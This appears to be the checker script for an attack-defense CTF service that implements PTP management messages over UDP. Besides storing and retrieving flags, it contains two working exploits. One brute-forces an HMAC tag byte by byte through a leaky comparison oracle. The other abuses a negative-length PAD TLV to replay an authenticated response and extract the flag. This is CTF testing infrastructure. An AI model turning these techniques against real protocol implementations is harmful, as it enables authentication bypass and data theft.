import asyncio
import typing
import traceback
import contextlib
import random
import string
import faker
import secrets
import string
import hmac
import hashlib
import struct

from logging import LoggerAdapter

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    FlagSearcher,
    BaseCheckerTaskMessage,
    PutflagCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    OfflineException,
    InternalErrorException,
    PutflagCheckerTaskMessage,
    AsyncSocket,
)
from enochecker3.utils import assert_equals, assert_in

import ptp_protocol
import ptp_message

"""
Checker config
"""

LOCAL_PORT = 2000
EVENT_PORT = 319
GENERAL_PORT = 320
HTTP_PORT = 1588
checker = Enochecker("syncryn1z3", HTTP_PORT)
app = lambda: checker.app


"""
Dependencies
"""

class UdpClientProtocol(asyncio.DatagramProtocol):
    def __init__(self, remote_address):
        self.remote_address = remote_address

        self.transport = None
        self.on_con_lost = asyncio.get_event_loop().create_future()

    def connection_made(self, transport):
        self.transport = transport

    def connection_lost(self, exc):
        if not self.on_con_lost.done():
            self.on_con_lost.set_result(True)

    def datagram_received(self, data, addr):
        if not self.response.done():
            self.response.set_result(data)

    def error_received(self, exc):
        if not self.response.done():
            self.response.set_exception(exc)

    def get_response_future(self):
        self.response = asyncio.get_event_loop().create_future()
        return self.response

class Connection:
    BUFFER_SIZE = 1500

    def __init__(self, protocol: UdpClientProtocol, logger: LoggerAdapter):
        self.protocol = protocol
        self.logger = logger

    def send_raw(self, request):
        self.protocol.get_response_future()
        self.protocol.transport.sendto(request, (self.protocol.remote_address, GENERAL_PORT))

    async def receive_raw(self):
        try:
            return await asyncio.wait_for(self.protocol.response, timeout=100.0)
        except asyncio.TimeoutError:
            raise OfflineException("Timeout waiting for response")

    def send(self, message):
        request = message.encode(self.BUFFER_SIZE)
        self.send_raw(request)

    async def receive(self):
        response = await self.receive_raw()
        message = ptp_message.from_buffer(response)

        return message

@checker.register_dependency
@contextlib.asynccontextmanager
async def _get_async_udp_protocol(task: BaseCheckerTaskMessage, logger: LoggerAdapter) -> typing.AsyncIterator[UdpClientProtocol]:
    try:
        transport, protocol = await asyncio.get_running_loop().create_datagram_endpoint(lambda: UdpClientProtocol(task.address), local_addr=("0.0.0.0", 0))
    except Exception as e:
        logger.info(f"Failed to create UDP endpoint {e}")
        raise InternalErrorException("Could not create UDP socket")

    try:
        yield protocol
    finally:
        transport.close()
        await protocol.on_con_lost

@checker.register_dependency
def _get_connection(protocol: typing.AsyncIterator[UdpClientProtocol], logger: LoggerAdapter) -> Connection:
    return Connection(protocol, logger)


"""
Utility functions
"""

def generate_secret(length: int):
    return (''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(length)))

def add_auth_tlv(message):
    tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_AUTHENTICATION)
    tlv.payload.authentication.policy = ptp_protocol.lib.PTP_AUTHENTICATION_POLICY_HMAC_128
    tlv.payload.authentication.parameter_indicator = 0
    tlv.payload.authentication.key_id = 0
    tlv.payload.authentication.icv_length = 16

def finalize_auth_tlvs(request, secret=b"", icv=None):
    message = ptp_message.from_buffer(request)
    buffer_address = ptp_protocol.ffi.cast("uint8_t *", ptp_protocol.ffi.addressof(ptp_protocol.ffi.from_buffer(request)))

    for tlv in message.get_tlvs():
        if tlv.type != ptp_protocol.lib.PTP_TLV_TYPE_AUTHENTICATION:
            continue
        
        icv_address = tlv.payload.authentication.icv

        if icv is None:
            icv = hmac.new(secret, bytearray(request)[:icv_address - buffer_address], hashlib.sha256).digest()

        ptp_protocol.ffi.memmove(icv_address, icv[:16], 16)

async def claim_port(connection: Connection, logger: LoggerAdapter, clock_id: int, port: int, secret: bytes, description: bytes, expect_error=False):
    if (len(secret) > 100):
        raise InternalErrorException("Secret too large")

    if (len(description) > 128):
        raise InternalErrorException("User description too large")
    
    message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, 0x0200000000000002, 1, 0) # TODO: randomize

    payload = message.get_payload()
    payload.management.target_port_id.clock_id = clock_id
    payload.management.target_port_id.port = port
    payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_COMMAND
    payload.management.starting_boundary_hops = 0
    payload.management.boundary_hops = 0

    tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
    tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_IMPLEMENTATION_SPECIFIC_PORT_CLAIM
    tlv.payload.management.payload.port_claim.authentication_policy = ptp_protocol.lib.PTP_AUTHENTICATION_POLICY_HMAC_128
    ptp_protocol.ffi.memmove(tlv.payload.management.payload.port_claim.port_secret, secret + b'\0', len(secret) + 1)
    ptp_protocol.ffi.memmove(tlv.payload.management.payload.port_claim.user_description, description + b'\0', len(description) + 1)

    connection.send(message)
    response = await connection.receive()

    if response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT:
        raise MumbleException("Expected management message in response")
    
    if response.decoded.payload.management.action != ptp_protocol.lib.PTP_MANAGEMENT_ACTION_ACKNOWLEDGE:
        raise MumbleException("Expected management acknowledge action")

    received_description = None

    for tlv in response.get_tlvs():
        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT:
            if tlv.payload.management.id == ptp_protocol.lib.PTP_MANAGEMENT_ID_IMPLEMENTATION_SPECIFIC_PORT_CLAIM:
                received_description = ptp_protocol.ffi.string(tlv.payload.management.payload.port_claim.user_description)
        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT_ERROR_STATUS:
            if expect_error:
                return ptp_protocol.ffi.string(tlv.payload.management_error_status.display_data).decode()
            else:
                logger.debug(f"Unexpected management error (claim_port): {ptp_protocol.ffi.string(tlv.payload.management_error_status.display_data).decode()}")
                raise MumbleException("Unexpected management error in PORT_CLAIM response")

    if received_description is None:
        raise MumbleException("Received no PORT_CLAIM TLV")
    
    assert_equals(received_description, description, "Received wrong user description in PORT_CLAIM response")
    
    if expect_error:
        raise MumbleException("Expected management error in PORT_CLAIM response")

async def get_user_description(connection: Connection, logger: LoggerAdapter, clock_id: int, port: int, secret: bytes, expected_description: bytes, expect_error=False):
    secret = secret + b'\x00' * (100 - len(secret))
    message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, 0x0200000000000002, 1, 0) # TODO: randomize

    payload = message.get_payload()
    payload.management.target_port_id.clock_id = clock_id
    payload.management.target_port_id.port = port
    payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_GET

    tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
    tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION

    add_auth_tlv(message)
    request = message.encode(connection.BUFFER_SIZE)
    finalize_auth_tlvs(request, secret=secret)

    connection.send_raw(request)
    response = await connection.receive()

    if response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT:
        raise MumbleException("Expected management message in response")
    
    if response.decoded.payload.management.action != ptp_protocol.lib.PTP_MANAGEMENT_ACTION_RESPONSE:
        raise MumbleException("Expected management response action")

    received_description = None

    for tlv in response.get_tlvs():
        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT:
            if tlv.payload.management.id == ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION:
                received_description = ptp_protocol.ffi.string(tlv.payload.management.payload.user_description)
        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT_ERROR_STATUS:
            if expect_error:
                return ptp_protocol.ffi.string(tlv.payload.management_error_status.display_data).decode()
            else:
                logger.debug(f"Unexpected management error (get user description): {ptp_protocol.ffi.string(tlv.payload.management_error_status.display_data).decode()}")
                raise MumbleException("Unexpected management error in USER_DESCRIPTION response")

    if received_description is None:
        raise MumbleException("Received no USER_DESCRIPTION TLV")
    
    logger.debug(f"{received_description} {expected_description}")
    assert_equals(received_description, expected_description, "Received wrong user description in USER_DESCRIPTION response")

    if expect_error:
        raise MumbleException("Expected management error in USER_DESCRIPTION response")

"""
CHECKER FUNCTIONS
"""

@checker.putflag(0)
async def putflag_user_description(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    connection: Connection,
    logger: LoggerAdapter,    
) -> None:
    clock_id = 0x0200000000000001
    port = random.randint(0x1, 0xfffe)
    secret = generate_secret(50)

    await claim_port(connection, logger, clock_id, port, secret.encode("ascii"), task.flag.encode("utf-8"))

    await db.set("userdata", (port, secret))

    return str(port)

@checker.getflag(0)
async def getflag_user_description(
    task: GetflagCheckerTaskMessage,
    db: ChainDB,
    connection: Connection,
    logger: LoggerAdapter,    
) -> None:
    clock_id = 0x0200000000000001

    try:
        port, secret = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    await get_user_description(connection, logger, clock_id, port, secret.encode("ascii"), task.flag.encode("utf-8"))
    
@checker.putnoise(0)
async def putnoise_user_description_twice(
    task: PutnoiseCheckerTaskMessage,
    db: ChainDB,
    connection: Connection,
    logger: LoggerAdapter,    
) -> None:
    clock_id = random.randint(0x0200000000000001, 0x02ffffffffffffff)
    port = random.randint(0x1, 0xfffe)
    secret = generate_secret(50)
    description = generate_secret(50)

    await claim_port(connection, logger, clock_id, port, secret.encode("ascii"), description.encode("utf-8"))
    error = await claim_port(connection, logger, clock_id, port, secret.encode("ascii"), generate_secret(50).encode("utf-8"), True)

    assert_equals(error, "Port already claimed", "Wrong error message")

    await db.set("userdata", (clock_id, port, secret, description))
    
@checker.getnoise(0)
async def putnoise_user_description_twice(
    task: GetnoiseCheckerTaskMessage,
    db: ChainDB,
    connection: Connection,
    logger: LoggerAdapter,    
) -> None:
    try:
        clock_id, port, secret, description = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    await get_user_description(connection, logger, clock_id, port, secret.encode("ascii"), description.encode("utf-8"))

@checker.exploit(0)
async def exploit_user_description_strcmp(
    task: ExploitCheckerTaskMessage,
    connection: Connection,
    logger:LoggerAdapter
) -> typing.Optional[str]:
    if task.attack_info is None:
        raise MumbleException("No attack info")
    
    port = int(task.attack_info)

    message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, 0x0200000000000002, 1, 0) # TODO: randomize

    payload = message.get_payload()
    payload.management.target_port_id.clock_id = 0x0200000000000001
    payload.management.target_port_id.port = port
    payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_GET
    payload.management.starting_boundary_hops = 0
    payload.management.boundary_hops = 0

    tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
    tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION

    add_auth_tlv(message)
    request = message.encode(connection.BUFFER_SIZE)

    icv = bytearray(16)

    for i in range(len(icv)):
        async def guess_byte(icv):
            finalize_auth_tlvs(request, icv=icv)

            connection.send_raw(request)
            response = await connection.receive()

            if response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT:
                raise MumbleException("Expected management message")

            for tlv in response.get_tlvs():
                if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT_ERROR_STATUS:
                    return tlv.payload.management_error_status.error_id - 0xc000
                elif tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT:
                    # Early return in case we guessed the ICV prematurely
                    logger.debug("Early return")
                    return 0
                
            raise MumbleException("No error status in response")

        guess_0 = await guess_byte(icv)
        icv[i] = 1
        guess_1 = await guess_byte(icv)

        # Check if we skipped a byte
        if guess_0 == guess_1 + 1 and guess_0 != 10:
            icv[i] = guess_0
        else:
            icv[i] = 10
            guess_10 = await guess_byte(icv)

            # Tiebraker
            if guess_0 == 1 and guess_10 == 9:
                icv[i] = 1
            elif guess_0 == 10 and guess_1 == 9:
                icv[i] = 10
            else:
                icv[i] = 0

    finalize_auth_tlvs(request, icv=icv)

    connection.send_raw(request)
    response = await connection.receive()

    if response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT:
        raise MumbleException("Expected management message in response")
    
    if response.decoded.payload.management.action != ptp_protocol.lib.PTP_MANAGEMENT_ACTION_RESPONSE:
        raise MumbleException("Expected management response action")
    
    for tlv in response.get_tlvs():
        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT:
            if tlv.payload.management.id == ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION:
                received_flag =  ptp_protocol.ffi.string(tlv.payload.management.payload.user_description).decode()
                logger.debug(f"Received flag {received_flag}")
                return received_flag

@checker.exploit(1)
async def exploit_user_description_replay(
    task: ExploitCheckerTaskMessage,
    connection: Connection,
    logger:LoggerAdapter
) -> typing.Optional[str]:
    if task.attack_info is None:
        raise MumbleException("No attack info")
    
    port = int(task.attack_info)

    # Spoof target port
    initial_message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, 0x0200000000000001, port, 0)

    payload = initial_message.get_payload()
    payload.management.target_port_id.clock_id = 0x0200000000000001
    payload.management.target_port_id.port = port
    payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_RESPONSE
    payload.management.starting_boundary_hops = 0
    payload.management.boundary_hops = 0

    tlv = initial_message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
    tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION

    add_auth_tlv(initial_message)

    connection.send(initial_message)
    response = await connection.receive_raw()

    altered_request = bytearray(response).rstrip(b'\0')[:-4]

    tlv_get_message = struct.pack("!HhHH", ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT, 4, ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION, 0)
    tlv_pad_message = struct.pack("!Hh", ptp_protocol.lib.PTP_TLV_TYPE_PAD, -38) # Jump back to auth TLV
    altered_request += tlv_get_message + tlv_pad_message

    if (len(response) < len(altered_request)):
        raise MumbleException(f"Not enough TLV tailroom (got {len(response)} but expected at least {len(altered_request)} bytes)")
    
    altered_request += b'\0' * (len(response) - len(altered_request))

    connection.send_raw(altered_request)
    response = await connection.receive()

    if response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT:
        raise MumbleException("Expected management message in response")
    
    if response.decoded.payload.management.action != ptp_protocol.lib.PTP_MANAGEMENT_ACTION_RESPONSE:
        raise MumbleException("Expected management response action")
    
    for tlv in response.get_tlvs():
        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT:
            if tlv.payload.management.id == ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION:
                received_flag =  ptp_protocol.ffi.string(tlv.payload.management.payload.user_description).decode()
                logger.debug(f"Received flag {received_flag}")
                return received_flag

if __name__ == "__main__":
    checker.run()